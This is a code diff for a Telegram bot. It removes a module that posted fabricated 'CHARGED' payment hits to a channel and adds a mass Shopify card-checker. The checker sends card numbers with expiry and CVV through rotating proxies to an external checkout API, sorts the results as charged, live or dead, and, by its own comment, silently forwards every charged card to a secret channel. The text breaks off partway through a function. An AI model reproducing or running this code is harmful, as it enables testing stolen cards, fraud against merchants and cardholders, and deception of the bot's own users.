@@ -1,86 +1,161 @@
 """
-fake_logs.py  v3  —  Owner-only advanced fake CHARGED hit stream.
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+sh.py  v28  —  /sh single-card + /msh mass Shopify checker
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Framework : python-telegram-bot v21
+API       : https://shopi.up.railway.app/shopii
+            GET ?cc=NUM|MM|YY|CVV&site=DOMAIN&proxy=http://ip:port
+            site  = plain domain, NO https:// prefix
+            proxy = http://ip:port  (WITH http:// prefix)
 
-HOW TO WIRE INTO main.py (only 2 lines needed):
+ROOT-CAUSE FIX:
+  The API ALWAYS returns HTTP 200. Errors come in the JSON body:
+    {"Response": "site error! status: 404"}
+  We check the RESPONSE STRING before classify_response.
+  "site error! status: 404/403" → blacklist site, zero-sleep skip.
+  Raw API response strings are shown directly to the user.
 
-    # ── Near the top with your other imports ──
-    import fake_logs
+SITES:
+  Sites are loaded exclusively from sites.txt on disk.
+  _load_sites() reads sites.txt; stops with a clear error if the file is missing.
+  No built-in fallback list — keep sites.txt updated.
 
-    # ── Inside main(), right before app.run_polling() ──
-    fake_logs.register(app)
+DM POLICY:
+  CHARGED → user DM + HIT_LOG_GROUP_ID + EXTRA_CHARGED_GROUP_ID
+  LIVE    → user DM only
+  TDS     → user DM only
+  DEAD    → nothing
 
-That is the ONLY change needed in main.py.
-sh.py and database.py are NOT touched.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-FEATURES
-  • /fakeon  — open the full control panel (DM only, owner only)
-  • /fakeoff — stop the stream
-  • Set log channel ID directly from DM — no need to enter the channel
-  • 3 fully configurable link buttons per fake log message
-  • Manage fake user IDs: add / toggle / remove
-  • Speed control: Slow / Normal / Fast
-  • Stats panel with per-ID hit counts + total
-  • Everything is owner-only and completely silent to all other users
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+EXPORTS:
+  get_sh_handler, _check_card_with_retry, SITE_RETRIES, SITE_TIMEOUT
+  MSH_SESSIONS, run_mass_batch, create_msh_session
+  cb_msh_result, cb_msh_stop, build_result_msg
+  _load_sites, _load_proxies
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
+from __future__ import annotations
 
-import os
-import random
-import logging
 import asyncio
+import database as db
+import json as _json
+import logging
+import random
+import re
+import string
+import time
+from datetime import datetime
 from html import escape
+from io import BytesIO
+from typing import Optional
 
-from telegram import (
-    Update,
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
+import aiohttp
+from telegram import Update, InputFile, MessageEntity
+from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes
+
+from config import (
+    OWNER_ID,
+    get_bin_info, tg_emoji,
+    RawMarkup, _btn,
+    BOT_NAME, CHANNEL_LINK,
 )
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    CallbackQueryHandler,
-    MessageHandler,
-    ContextTypes,
-    filters,
-)
-from telegram.error import BadRequest, Forbidden, NetworkError, RetryAfter, TimedOut
 
-from config import RawMarkup, _btn
-from sh import CARD_CHK_BTN_EMOJI_ID, BOT_USERNAME_LINK
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# CONSTANTS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+API_URL       = "https://luci.up.railway.app/shopii"
+BOT_CHANNEL   = CHANNEL_LINK
+DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'
 
-logger = logging.getLogger(__name__)
+HIT_LOG_GROUP_ID       = -1004361062205   # public hit log group
+EXTRA_CHARGED_GROUP_ID = -1003991915326   # extra charged log
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CONFIGURATION  (read from environment — same vars as main.py)
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-OWNER_ID        = int(os.environ.get("OWNER_ID", "0"))
-_DEFAULT_OWNER_FAKE_UID = "8283904645"
-_DEFAULT_CHANNEL_ID = -1004361062205
+# ── Secret channel — auto-receives every CHARGED card silently ──────────────
+SECRET_CHANNEL_ID   = -1003968669478
+SECRET_CHANNEL_LINK = "https://t.me/+BfUGjEXaySM2MDc0"
+# ── Result card buttons ─────────────────────────────────────────────────────
+BOT_USERNAME_LINK   = "https://t.me/Batxchk_bot"
+BOT_PLANS_LINK      = "https://t.me/Batxchk_bot?start=plans"  # deep-links → /plans
+MY_CHANNEL_LINK     = "https://t.me/Batcardchk"                    # main channel
+LOGS_CHANNEL_LINK   = "https://t.me/+XYnHim3rGsw0Yzdk"             # hits log channel
 
+SH_COOLDOWN    = 25
 
-def _read_channel_id() -> int:
-    raw = os.environ.get("FAKE_LOG_CHANNEL_ID", "").strip()
-    if not raw:
-        return _DEFAULT_CHANNEL_ID
-    try:
-        value = int(raw)
-    except ValueError:
-        logger.error("[FAKELOGS] Invalid FAKE_LOG_CHANNEL_ID; using %s.", _DEFAULT_CHANNEL_ID)
-        return _DEFAULT_CHANNEL_ID
-    if value > 0:
-        return _DEFAULT_CHANNEL_ID
-    return value
+# ── Speed / concurrency settings ───────────────────────────────────────────
+SITE_RETRIES       = 20   # max site attempts per card (was 80 — overkill)
+SITE_TIMEOUT       = 30   # seconds per API call — generous for slow Railway
+MAX_CONCURRENT     = 25    # cards in parallel during /msh  (was 50)
+CARD_STAGGER       = 1.5  # seconds between card launches  (was 0.3)
+SITE_BATCH         = 1    # sites tried per round (was 3 — caused API floods)
+ROUND_DELAY        = 0.5  # seconds to sleep between retry rounds per card
+CONSEC_TIMEOUT_MAX = 5    # abort after 5 consecutive timeouts (was 45)
+API_CONCURRENCY    = 20   # global semaphore cap — max simultaneous API calls
+BUTTON_LOCK    = 30
 
+_CB_RESULT = "mshr"
+_CB_STOP   = "mshs"
 
-_ENV_CHANNEL_ID = _read_channel_id()
-_DEFAULT_BOT_URL = "https://t.me/Batxchk_bot"
+MSH_SESSIONS: dict  = {}
+_BIN_CACHE:   dict  = {}
+_DEAD_SITES:  set   = set()
+_ALL_PROXIES: list  = []
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CUSTOM EMOJI IDs  (hardcoded — zero dependency on sh.py)
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-_CHARGED_EMOJI_IDS = [
+# ── Disk-IO TTL caches ─────────────────────────────────────────────────────
+_PROXY_CACHE_TS:  float = 0.0
+_PROXY_CACHE_TTL: float = 300.0   # refresh proxies from disk every 5 minutes
+
+_SITES_RAW_CACHE: list  = []
+_SITES_RAW_TS:    float = 0.0
+_SITES_RAW_TTL:   float = 300.0   # refresh sites from disk every 5 minutes
+
+# Site-prober cache — populated by probe_all_sites(), used by get_working_sites()
+_WORKING_SITES:     list  = []
+_PROBE_IN_PROGRESS: bool  = False
+_PROBE_LAST_RUN:    float = 0.0
+_PROBE_TASK:        "asyncio.Task | None" = None
+PROBE_TTL:          float = 1800.0   # re-probe every 30 min
+PROBE_CARD:         str   = "4000223372377978|05|29|651"
+PROBE_TIMEOUT:      float = 20.0
+PROBE_CONCURRENCY:  int   = 60
+
+# Global API rate-limiter
+_API_SEM: "asyncio.Semaphore | None" = None
+
+def _get_api_sem() -> "asyncio.Semaphore":
+    global _API_SEM
+    if _API_SEM is None:
+        _API_SEM = asyncio.Semaphore(API_CONCURRENCY)
+    return _API_SEM
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# EMOJI IDS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+CARD_EMOJI_ID     = "5800709991627232190"
+USER_EMOJI_ID     = "6267115986541877538"
+TIME_EMOJI_ID     = "6285240160120477644"
+DEV_EMOJI_ID      = "6267091732861555879"
+PRO_EMOJI_ID      = "6280484433027931563"
+DECLINED_EMOJI_ID = "4956612582816351459"
+
+HIT_GATE_EMOJI_ID = "5341715473882955310"
+HIT_RESP_EMOJI_ID = "5839116473951328489"
+
+PROG_GATE_EMOJI_ID     = "5370935802844946281"
+PROG_PROGRESS_EMOJI_ID = "5116268964023894989"
+PROG_CHARGED_EMOJI_ID  = "5427168083074628963"
+PROG_LIVE_EMOJI_ID     = "6296367896398399651"
+PROG_DEAD_EMOJI_ID     = "4958526153955476488"
+PROG_ERRORS_EMOJI_ID   = "4956611513369494230"
+
+SH_GATE_EMOJI_ID = "6220029508456548253"
+SH_PROG_EMOJI_ID = "6298691319086712919"
+SH_LIVE_EMOJI_ID = "6296367896398399651"
+
+BTN_CHARGED_EMOJI_ID  = "5465465194056525619"
+BTN_LIVE_EMOJI_ID     = "5039793437776282663"
+BTN_ALL_EMOJI_ID      = "4956324463525233747"
+BTN_STOP_EMOJI_ID     = "6179444193518162239"
+CARD_CHK_BTN_EMOJI_ID = "5935795874251674052"
+
+CHARGED_EMOJI_IDS = [
     "5801154993188770160", "4956739572114392015", "5285221724634239278",
     "5287777298894835685", "5285024405246725814", "5287547831677112267",
     "5287658362660474522", "5285186510197381130", "5803233241963959320",
@@ -88,1050 +163,998 @@ _CHARGED_EMOJI_IDS = [
     "5801005158959683238", "5436143465211640305", "5800688138833629633",
     "5891044423856296980", "5436068999068662274", "5427168083074628963",
 ]
-_HIT_RESP_EID = "5839116473951328489"   # ✅  green check custom emoji
-_PRO_EID      = "6280484433027931563"   # ⭐  plan star custom emoji
 
-
-def _rand_eid() -> str:
-    return random.choice(_CHARGED_EMOJI_IDS)
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# BOT-DATA KEYS
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-_K_ACTIVE   = "fakelogs_active"      # bool  — is the stream running?
-_K_CHANNEL  = "fakelogs_channel_id"  # int   — target channel/group ID
-_K_IDS      = "fl_ids"              # list  — fake user ID entries
-_K_SPEED    = "fl_speed"            # str   — "slow"|"normal"|"fast"
-_K_LINKS    = "fl_links"            # list  — 3 button link dicts
-_K_STATE    = "fl_state"            # str   — current awaiting-input state
-_K_EDIT_IDX = "fl_edit_link_idx"    # int   — which link slot is being edited
-_JOB        = "fake_hit_stream"
-_K_TASK     = "fakelogs_stream_task"
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# SPEED PRESETS  (min_delay, max_delay) in seconds
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-_SPEEDS = {
-    "slow":   (90,  180),   # 1.5 – 3 min
-    "normal": (40,   80),   # 40 s – 1.5 min  ← default
-    "fast":   (18,   35),   # 18 – 35 s
-}
-_SPEED_LABELS = {
-    "slow":   "🐢 Slow  (1.5–3 min)",
-    "normal": "🚶 Normal (40–80 s)",
-    "fast":   "🏃 Fast  (18–35 s)",
-}
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# PRICE POOL
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-_PRICES = [
-    # Sub-$1 micro charges
-    "0.49", "0.69", "0.79", "0.89", "0.99",
-    # $1 range
-    "1.09", "1.29", "1.49", "1.69", "1.79", "1.89", "1.99",
-    # $2 range
-    "2.09", "2.19", "2.29", "2.39", "2.49", "2.59", "2.69", "2.79", "2.89", "2.99",
-    # $3 range
-    "3.19", "3.29", "3.39", "3.47", "3.49", "3.59", "3.69", "3.79", "3.89", "3.99",
-    # $4 range
-    "4.09", "4.19", "4.29", "4.39", "4.49", "4.59", "4.69", "4.79", "4.89", "4.99",
-    # $5 range
-    "5.09", "5.19", "5.29", "5.39", "5.47", "5.49", "5.59", "5.69", "5.79", "5.89", "5.99",
-    # $6 range
-    "6.09", "6.19", "6.29", "6.39", "6.49", "6.59", "6.69", "6.79", "6.89", "6.99",
-    # $7 range
-    "7.09", "7.19", "7.29", "7.39", "7.49", "7.59", "7.69", "7.79", "7.89", "7.99",
-    # $8 range
-    "8.09", "8.19", "8.29", "8.39", "8.49", "8.59", "8.69", "8.79", "8.89", "8.99",
-    # $9 range
-    "9.09", "9.19", "9.29", "9.39", "9.49", "9.59", "9.69", "9.79", "9.89", "9.99",
+LIVE_EMOJI_IDS = [
+    "6296367896398399651",
 ]
 
+PLAN_EMOJIS = {
+    "CORE":   "5379869575338812919",
+    "ELITE":  "5836898273666798437",
+    "ROOT":   "4956420911310832630",
+    "CUSTOM": "5445027583588593750",
+}
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# BOT-DATA ACCESSORS
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SPECIAL_FONT_MAP = {
+    'ᴀ': 'A', 'ʙ': 'B', 'ᴄ': 'C', 'ᴅ': 'D', 'ᴇ': 'E',
+    'ꜰ': 'F', 'ɢ': 'G', 'ʜ': 'H', 'ɪ': 'I', 'ᴊ': 'J',
+    'ᴋ': 'K', 'ʟ': 'L', 'ᴍ': 'M', 'ɴ': 'N', 'ᴏ': 'O',
+    'ᴘ': 'P', 'ǫ': 'Q', 'ʀ': 'R', 'ꜱ': 'S', 'ᴛ': 'T',
+    'ᴜ': 'U', 'ᴠ': 'V', 'ᴡ': 'W', 'x': 'X', 'ʏ': 'Y',
+    'ᴢ': 'Z', 'Ɪ': 'I',
+}
 
-def _get_ids(bd: dict) -> list:
-    ids = bd.setdefault(_K_IDS, [])
-    # IDs live only in bot_data memory. They are not written to a database/file.
-    # Seed the default only on first initialization; removing the last ID must
-    # leave the list empty instead of silently recreating it.
-    if not bd.get("fl_ids_initialized"):
-        bd["fl_ids_initialized"] = True
-        if not ids:
-            bd["fl_ids_seeded"] = True
-            ids.append({
-                "uid": _DEFAULT_OWNER_FAKE_UID,
-                "display": f"user_{_DEFAULT_OWNER_FAKE_UID}",
-                "link": f"tg://user?id={_DEFAULT_OWNER_FAKE_UID}",
-                "enabled": True,
-                "count": 0,
-            })
-    return ids
+def get_random_charged_emoji() -> str:
+    return random.choice(CHARGED_EMOJI_IDS)
+
+def get_random_live_emoji() -> str:
+    return random.choice(LIVE_EMOJI_IDS)
+
+def get_plan_emoji_id(plan_name: str) -> str:
+    if not plan_name: return PRO_EMOJI_ID
+    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in plan_name)
+    if norm in PLAN_EMOJIS: return PLAN_EMOJIS[norm]
+    for k, v in PLAN_EMOJIS.items():
+        if k in norm: return v
+    return PRO_EMOJI_ID
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# RESPONSE CLASSIFICATION
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+RETRY_ERRORS = [
+    'r4 token empty', 'r2 id empty', 'clinte token',
+    'failed to get token', 'token not found', 'failed to get checkout',
+    'failed to get session token', 'failed to add to cart',
+    'could not extract receiptid', 'receiptid missing',
+    'response missing receiptid', 'missing receiptId', 'errmissingreceiptid',
+    'could not extract signedhandles', 'extract signedHandles',
+    'could not extract private_access_token',
+    'could not extract identification signature',
+    'could not extract session id', 'could not extract queuetoken',
+    'could not extract delivery handle', 'could not extract shipping amount',
+    'could not extract total amount', 'could not extract sessiontoken',
+    'could not find actions js url',
+    'missing stableid', 'missing buildid', 'missing sourcetoken',
+    'missing proposal', 'missing submit id',
+    'payment method is not shopify!', 'not shopify!',
+    'site not supported for now!', 'site not supported',
+    'site requires login!', 'site overloaded', 'site rate limited',
+    'application not found', 'store not found', 'app not found',
+    'store incompatible', 'errstoreincompatible',
+    'product not found', 'product id is empty', 'py id empty',
+    'no valid products', 'no available products found',
+    'NO_PRODUCTS', 'NO_PRODUCT', 'no_products',
+    'MERCHANDISE_OUT_OF_STOCK', 'products.json',
+    'INVENTORY_FAILURE', 'inventory_failure',
+    'retryable: inventory reservation failure',
+    'hcaptcha detected', 'hcaptcha_detected',
+    'DELIVERY_ZONE_NOT_FOUND', 'delivery_zone_not_found',
+    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
+    'delivery_no_delivery_strategy_available',
+    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
+    'delivery_no_delivery_strategy_available_for_merchandise_line',
+    'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
+    'delivery_delivery_line_detail_changed',
+    'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
+    'delivery_strategy_conditions_not_satisfied',
+    'DELIVERY_OUT_OF_STOCK_AT_ORIGIN_LOCATION',
+    'delivery_out_of_stock_at_origin_location',
+    'SESSION_ERROR', 'session_error', 'receipt_empty',
+    'invalid_response', 'checkout_failed', 'VALIDATION_CUSTOM', 'validation_custom',
+    'VAULT_FAILED', 'exceeded 30 poll attempts',
+    'tax ammount empty', 'del ammount empty',
+    'site error! status: 401', 'site error! status: 402',
+    'site error! status: 403', 'site error! status: 404',
+    'site error! status: 429',
+    'site error! status: 500', 'site error! status: 502',
+    'site error! status: 503', 'site error! 503',
+    'site error',
+    'returned status 429', 'returned status 500',
+    'returned status 502', 'returned status 503', 'returned status 504',
+    'connection error', 'connection error!',
+    'could not resolve host', 'connect tunnel failed',
+    'proxy error', 'curl error', 'http error',
+    'timeout',
+    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
+    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
+    'step 8 failed', 'step 9 failed', 'step 10 failed',
+    'error processing card',
+    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
+    'payments_credit_card_brand_not_supported',
+    'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
+    'buyer_identity_currency_not_supported_by_shop',
+    'BUYER_IDENTITY_MARKETING_CONSENT_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
+    'unable to get payment token',
+]
+
+DECLINED_RESPONSES = [
+    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
+    'DO NOT HONOR', 'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'Processing Error',
+    'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
+    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD',
+    'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
+    'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD',
+    'TRANSACTION_NOT_ALLOWED',
+]
+
+DEAD_ERRORS     = RETRY_ERRORS
+SUCCESS_RESPONSES = [
+    'INSUFFICIENT_FUNDS', 'INCORRECT_CVV', 'INCORRECT_CVC', 'INCORRECT_ZIP',
+    'INVALID_CVC', '3DS_REQUIRED', 'ORDER_PAID',
+    'CARD_DECLINED', 'GENERIC_DECLINE', 'DO NOT HONOR', 'DO_NOT_HONOR', 
+    'UNKNOWN_ERROR', 'Processing Error', 'PROCESSING_ERROR', 'GENERIC_ERROR',
+    'EXPIRED_CARD', 'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
+    'AMOUNT_TOO_SMALL', 'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD',
+    'TEST_MODE_LIVE_CARD', 'INCORRECT_NUMBER', 'RESTRICTED_CARD',
+    'STOLEN_CARD', 'LOST_CARD', 'TRANSACTION_NOT_ALLOWED',
+]
+
+def _is_dead_site_response(resp: str) -> bool:
+    r = resp.lower().strip()
+    return any(err.lower() in r for err in RETRY_ERRORS)
+
+def _is_success_response(resp: str) -> bool:
+    ru = resp.upper().strip()
+    return any(s.upper() in ru for s in SUCCESS_RESPONSES)
+
+def classify_response(resp: str) -> str:
+    """
+    Classify a response string from shopi.up.railway.app.
+    Returns one of: CHARGED | TDS | LIVE | RECHECK | DEAD | RETRY | ERROR
+    """
+    if not resp:
+        return "RETRY"
+    mu = resp.upper().strip()
+    ml = resp.lower().strip()
+
+    # ── CHARGED ──────────────────────────────────────────────────────────────
+    if ("ORDER_PAID"          in mu
+            or "PAYMENT_AUTHORIZED" in mu
+            or "PAYMENT_ACCEPTED"   in mu
+            or "APPROVED"           in mu
+            or mu == "CHARGED"):
+        return "CHARGED"
+
+    # ── TDS (3-D Secure redirect) — treated as RECHECK now ─────────────────
+    if ("3DS_REQUIRED"            in mu
+            or "3D_SECURE"            in mu
+            or "AUTHENTICATION_REQUIRED" in mu
+            or "SCA_REQUIRED"         in mu):
+        return "RECHECK"
+
+    # ── LIVE (Primary confirmed bank responses) ─────────────────────────────
+    # Only Insufficient Funds and Generic Error are kept as LIVE immediately.
+    if ("INSUFFICIENT_FUNDS"       in mu
+            or "GENERIC_ERROR"         in mu):
+        return "LIVE"
+
+    # ── RECHECK (Secondary responses that might be live, but we recheck) ────
+    # Any other response is not shown as Live immediately. We recheck.
+    if ("INCORRECT_CVV"         in mu
+            or "INCORRECT_CVC"         in mu
+            or "INCORRECT_ZIP"         in mu
+            or "INVALID_CVC"           in mu
+            or "INVALID_CVV"           in mu
+            or "PCI_ERROR"             in mu
+            or "CVV_FAILED"            in mu
+            or "AVS_FAILED"            in mu
+            or "RISK_BLOCKED"          in mu
+            or "SECURITY_VIOLATION"    in mu
+            or "CALL_ISSUER"           in mu
+            or "TRANSFORMER_FINGERPRINT" in mu
+            or "FINGERPRINT"           in mu
+            or "PCI"                   in mu
+            or ("ARTIFACT" in mu and "SELLER" in mu)
+            or "COMPLIANCE"            in mu
+            or "CVV2"                  in mu
+            or "AVS"                   in mu
+            or "RISK"                  in mu
+            or "VELOCITY"              in mu
+            ):
+        return "RECHECK"
+
+    # ── DEAD (confirmed bank hard-decline — card is bad) ─────────────────────
+    if any(d.upper() in mu for d in DECLINED_RESPONSES):
+        return "DEAD"
+
+    # ── RETRY (site/infra error — skip to a different Shopify site) ──────────
+    if any(r.lower() in ml for r in RETRY_ERRORS):
+        return "RETRY"
+
+    # ── Unknown response → RECHECK ───────────────────────────────────────────
+    # Anything reaching here is NOT a site error and NOT a confirmed hard-decline.
+    # Recheck the card instead of showing as LIVE immediately.
+    return "RECHECK"
 
 
-def _get_speed(bd: dict) -> str:
-    return bd.get(_K_SPEED, "normal")
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# LOADERS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def _strip_proxy_scheme(p: str) -> str:
+    for pfx in ("socks5://", "socks4://", "https://", "http://"):
+        if p.startswith(pfx):
+            return p[len(pfx):]
+    return p
 
+def _load_proxies() -> list:
+    global _ALL_PROXIES, _PROXY_CACHE_TS
+    import os
+    now = time.time()
+    if _ALL_PROXIES and (now - _PROXY_CACHE_TS) < _PROXY_CACHE_TTL:
+        return list(_ALL_PROXIES)
 
-def _get_channel(bd: dict) -> int:
-    return bd.get(_K_CHANNEL, _ENV_CHANNEL_ID)
+    for fname in ("px.txt", "proxies.txt"):
+        for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
+            path = os.path.join(base, fname) if base else fname
+            try:
+                with open(path, encoding="utf-8", errors="ignore") as f:
+                    raw = [l.strip() for l in f
+                           if l.strip() and not l.startswith(("#", "//", ";"))]
+                if raw:
+                    lines = [_strip_proxy_scheme(p) for p in raw]
+                    _ALL_PROXIES    = lines
+                    _PROXY_CACHE_TS = time.time()
+                    logging.info(f"[SH] {len(lines)} proxies loaded from {path}")
+                    return lines
+            except (FileNotFoundError, PermissionError):
+                pass
+    logging.warning("[SH] No proxy file found — add px.txt with ip:port lines")
+    _ALL_PROXIES    = []
+    _PROXY_CACHE_TS = time.time()
+    return []
 
+def _strip_scheme(url: str) -> str:
+    url = url.strip()
+    for pfx in ("https://", "http://", "www."):
+        if url.startswith(pfx):
+            url = url[len(pfx):]
+    return url.rstrip("/")
 
-def _get_links(bd: dict) -> list:
-    """Return the 3 link-button configs, creating defaults on first call."""
-    links = bd.get(_K_LINKS)
-    if not links or len(links) < 3:
-        links = [
-            {"text": "𝘽𝘼𝙏 ✘ 𝘾𝙃𝙆", "url": _DEFAULT_BOT_URL},
-            {"text": "",             "url": ""},
-            {"text": "",             "url": ""},
-        ]
-        bd[_K_LINKS] = links
-    return links
+def _load_sites() -> list:
+    global _SITES_RAW_CACHE, _SITES_RAW_TS
+    import os
+    now = time.time()
+    if _SITES_RAW_CACHE and (now - _SITES_RAW_TS) < _SITES_RAW_TTL:
+        result = list(_SITES_RAW_CACHE)
+        random.shuffle(result)
+        return result
 
-
-def _stop_job(context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Stop only an explicitly requested stream and legacy scheduled jobs."""
-    task = context.bot_data.get(_K_TASK)
-    if task is not None and not task.done():
-        task.cancel()
-    context.bot_data.pop(_K_TASK, None)
-
-    job_queue = context.job_queue
-    if job_queue is None:
-        return
-    for job in job_queue.get_jobs_by_name(_JOB):
-        job.schedule_removal()
-
-
-def _clear_state(bd: dict) -> None:
-    bd[_K_STATE]    = None
-    bd[_K_EDIT_IDX] = None
-
-
-async def _validate_target(bot, target: int) -> str:
-    """Return an actionable error, or an empty string when the target is usable."""
-    if not isinstance(target, int) or target >= 0:
-        return (
-            "Target must be a Telegram channel/group ID beginning with -100. "
-            "A private user/DM ID cannot receive the log stream."
-        )
-    try:
-        chat = await bot.get_chat(target)
-        if chat.type not in ("channel", "group", "supergroup"):
-            return f"Target chat type is {chat.type!r}; choose a channel or group."
-
-        me = await bot.get_me()
-        member = await bot.get_chat_member(target, me.id)
-        status = getattr(member, "status", "")
-        if chat.type == "channel" and status not in ("administrator", "creator"):
-            return "The bot must be an administrator of the target channel."
-        if chat.type != "channel" and status in ("left", "kicked"):
-            return "The bot is not a member of the target group."
-        return ""
-    except Forbidden:
-        return "Telegram denied access. Add the bot as an administrator of the target channel."
-    except BadRequest as exc:
-        return f"Telegram rejected the target: {str(exc)[:300]}"
-    except Exception as exc:
-        return f"Could not verify the target chat: {str(exc)[:300]}"
-
-
-async def _send_with_retry(context, target: int, text: str, reply_markup) -> None:
-    """Send one event with bounded retries for temporary Telegram/network errors."""
-    retry_delays = (1.0, 3.0, 8.0)
-    for attempt, delay in enumerate(retry_delays, start=1):
+    for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
+        path = os.path.join(base, "sites.txt") if base else "sites.txt"
         try:
-            await context.bot.send_message(
-                target, text,
-                parse_mode="HTML",
-                reply_markup=reply_markup,
-                disable_web_page_preview=True,
-            )
-            return
-        except RetryAfter as exc:
-            if attempt == len(retry_delays):
-                raise
-            wait_for = min(float(getattr(exc, "retry_after", delay)), 30.0)
-            logger.warning(
-                "[FAKELOGS] Telegram rate limit; retry %s/%s in %.1fs",
-                attempt, len(retry_delays), wait_for,
-            )
-            await asyncio.sleep(wait_for)
-        except (NetworkError, TimedOut, asyncio.TimeoutError) as exc:
-            if attempt == len(retry_delays):
-                raise
-            logger.warning(
-                "[FAKELOGS] temporary send failure; retry %s/%s in %.1fs: %s",
-                attempt, len(retry_delays), delay, exc,
-            )
-            await asyncio.sleep(delay)
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# FAKE LOG MESSAGE BUILDER
-# Produces a compact, clearly marked test event without payment data.
-# Format:
-#   🧪 TEST ONLY • NOT A REAL PAYMENT
-#   HIT → CHARGED 💎
-#   Gate → Shopify • 5.47 USD
-#   ✅ TEST_ORDER_PAID
-#   User → @username ⭐
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-def _build_log_text(id_entry: dict) -> str:
-    price = random.choice(_PRICES)
-    eid   = _rand_eid()
-    ulink = f'<a href="{id_entry["link"]}">{id_entry["display"]}</a>'
-    return (
-        f'<b>HIT ➛ CHARGED '
-        f'<tg-emoji emoji-id="{eid}">💎</tg-emoji></b>\n'
-        f'<b>Gate ➛ Shopify • {price} USD</b>\n'
-        f'<b><tg-emoji emoji-id="{_HIT_RESP_EID}">✅</tg-emoji>'
-        f' <code>ORDER_PAID</code></b>\n'
-        f'<b>User ➛ {ulink}'
-        f' <tg-emoji emoji-id="{_PRO_EID}">⭐</tg-emoji></b>'
+            with open(path, encoding="utf-8", errors="ignore") as f:
+                raw_lines = [_strip_scheme(l) for l in f
+                             if l.strip() and not l.startswith("#")]
+            raw_lines = [l for l in raw_lines if l]
+            if raw_lines:
